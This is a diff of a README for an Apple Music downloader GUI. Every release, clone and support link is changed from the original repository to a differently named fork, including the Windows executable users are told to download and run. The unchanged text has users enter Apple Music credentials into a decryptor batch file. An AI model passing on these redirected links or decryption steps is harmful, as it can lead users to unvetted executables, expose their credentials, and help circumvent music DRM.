@@ -2,14 +2,14 @@
 
 A GUI-based Apple Music downloader for Atmos, Lossless, and AAC formats (needs to be built from source for MacOS, Linux).
 
-**Get the latest Windows app from [releases](https://github.com/rwnk-12/apmyx-gui/releases)**. Please refer to the [Installation](https://github.com/rwnk-12/apmyx-gui?tab=readme-ov-file#installation) section before starting the GUI to avoid any errors.
+**Get the latest Windows app from [releases](https://github.com/fabriguzden/apmyx-gui-Fixed/releases)**. Please refer to the [Installation](https://github.com/fabriguzden/apmyx-gui-Fixed?tab=readme-ov-file#installation) section before starting the GUI to avoid any errors.
 
 ## About
 
 Easily download playlists, songs, albums, and artist discographies up to Lossless 24-bit/192kHz, and music videos up to 4K.
 
-- **Music videos, lyrics, AAC LC 256** only need a [token](https://github.com/rwnk-12/apmyx-gui/blob/master/README.md#getting-your-media-user-token), no wrapper required.
-- **ALAC, Atmos, AAC Binaural, Downmix** require the wrapper. Setup guide for [MacOS](https://github.com/rwnk-12/apmyx-gui?tab=readme-ov-file#wrapper-installation-macos) / [Windows](https://github.com/rwnk-12/apmyx-gui?tab=readme-ov-file#wrapper-installation-windows). ([Additional MacOS guide](https://gist.github.com/mattneub/cd1d7890a5cc26e7e8053f019cb9cd54))
+- **Music videos, lyrics, AAC LC 256** only need a [token](https://github.com/fabriguzden/apmyx-gui-Fixed/blob/master/README.md#getting-your-media-user-token), no wrapper required.
+- **ALAC, Atmos, AAC Binaural, Downmix** require the wrapper. Setup guide for [MacOS](https://github.com/fabriguzden/apmyx-gui-Fixed?tab=readme-ov-file#wrapper-installation-macos) / [Windows](https://github.com/fabriguzden/apmyx-gui-Fixed?tab=readme-ov-file#wrapper-installation-windows). ([Additional MacOS guide](https://gist.github.com/mattneub/cd1d7890a5cc26e7e8053f019cb9cd54))
 
 ## Features
 
@@ -59,9 +59,9 @@ Install [Get cookies.txt LOCALLY](https://chromewebstore.google.com/detail/get-c
 
 ## Installation
 
-1. Download the latest release from [Releases](https://github.com/rwnk-12/apmyx-gui/releases) and extract it.
+1. Download the latest release from [Releases](https://github.com/fabriguzden/apmyx-gui-Fixed/releases) and extract it.
 2. Run `apmyx.exe`.
-3. Enter your [media user token](https://github.com/rwnk-12/apmyx-gui?tab=readme-ov-file#getting-your-media-user-token) in settings.
+3. Enter your [media user token](https://github.com/fabriguzden/apmyx-gui-Fixed?tab=readme-ov-file#getting-your-media-user-token) in settings.
 
 ## Wrapper Installation (Windows)
 
@@ -73,11 +73,11 @@ Only needed for **ALAC, Atmos, AAC Binaural, AAC Downmix**.
 4. Open `1. Run decryptor (!!!need to replace username and password in this file).bat` in Notepad, replace `username:password` with your Apple Music credentials (enclose in quotes, e.g. `"email@example.com:password"`), save, and run it.
 5. Wait for `response type 6 and listening status` and keep this window open while using apmyx.
 
-Then download and run `apmyx.exe` from [releases](https://github.com/rwnk-12/apmyx-gui/releases), or run from source:
+Then download and run `apmyx.exe` from [releases](https://github.com/fabriguzden/apmyx-gui-Fixed/releases), or run from source:
 
 ```bash
-git clone https://github.com/rwnk-12/apmyx-gui.git
-cd apmyx-gui
+git clone https://github.com/fabriguzden/apmyx-gui-Fixed.git
+cd apmyx-gui-Fixed
 pip install -r requirements.txt
 cd src
 python main.py
@@ -107,8 +107,8 @@ docker run -v ./rootfs/data:/app/rootfs/data -p 10020:10020 -p 20020:20020 -e ar
 
 ### Step 4: Start apmyx
 ```bash
-git clone https://github.com/rwnk-12/apmyx-gui.git
-cd apmyx-gui
+git clone https://github.com/fabriguzden/apmyx-gui-Fixed.git
+cd apmyx-gui-Fixed
 pip install -r requirements.txt
 cd src
 python main.py
@@ -125,8 +125,8 @@ python main.py
 **Prerequisites:** Go 1.18+, Python 3.9+, FFmpeg, mp4box, mp4decrypt.
 
 ```bash
-git clone https://github.com/rwnk-12/apmyx-gui.git
-cd apmyx-gui/scripts
+git clone https://github.com/fabriguzden/apmyx-gui-Fixed.git
+cd apmyx-gui-Fixed/scripts
 
 # Build Go backend
 chmod +x build_go.sh
@@ -145,7 +145,7 @@ python main.py
 
 ## Support
 
-For issues or questions, [open an issue on GitHub](https://github.com/rwnk-12/apmyx-gui/issues).
+For issues or questions, [open an issue on GitHub](https://github.com/fabriguzden/apmyx-gui-Fixed/issues).
 
 ## Credits & References
 
